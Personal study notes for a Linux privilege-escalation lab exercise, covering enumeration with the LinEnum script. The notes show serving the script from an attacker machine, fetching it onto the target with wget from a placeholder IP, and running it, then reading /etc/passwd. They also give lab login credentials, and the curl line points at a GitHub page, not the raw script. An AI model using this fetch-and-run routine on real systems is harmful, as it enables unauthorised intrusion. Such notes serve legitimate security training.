Common Linux Privesc
####################
:Author: David Boyd
:Date: 2020-06-02
:SSH Login: user3, password

[Task 4] Enumeration
====================

LinEnum
	a bash script that perfoms common commands related to privilege escalation.

	Saves time (allowing more effort to be put toward getting root).

Get LinEnum
-----------

curl -O https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh

	- -O, --remote-name

		-O'riginal'-rem'O'te-name.  Writes output to a local file with the same
		name as the original remote name.

Push LinEnum on TM (Target Machine)
-----------------------------------

Steps
~~~~~

1.	Setup Python server on your machine
2.	from TM (target machine), wget your.Machine.IP.addr:port/file.sh
3.	from TM, chmod +x file.sh && run file.sh

Python3
~~~~~~~

http.server    (import http.server)
	this module defines classes for implementing HTTP servers (Web servers).

	-m

Issues
~~~~~~
:Issue: Python2 code is deprecated.
:Tricks: Use the **2to3** utility to convert Python2 prgms to Python3.
:Solution: The *SimpleHTTPServer* module has been merged into the
           *http.server* in Python 3.0

.. code-block :: Python

	python3 -m http.server 8000

	python -m SimpleHTTPServer 8000

The http.server is invoked directly using the *-m* switch of the interpreter
with a port number argument.  **This serves files relative to the currect
directory.**  // Think: -m = "main directory"

Sandbox
~~~~~~~

.. code-block :: Python

	# My machine
	python3 -m http.server 8000

	# TM
	wget my.ip.add.ress:8000/LinEnum.sh
	chmod +x LinEnum.sh
	./LinEnum.sh


Questions
---------

.. code-block :: Bash

	# What is the target's hostname?
	hostname

	# Look at the output of /etc/passwd,
	# how many "user[x]" are there on the system?
	cat /etc/passwd | grep user[0-9]

	# How many available shells are there on the system?
	cat /etc/shells

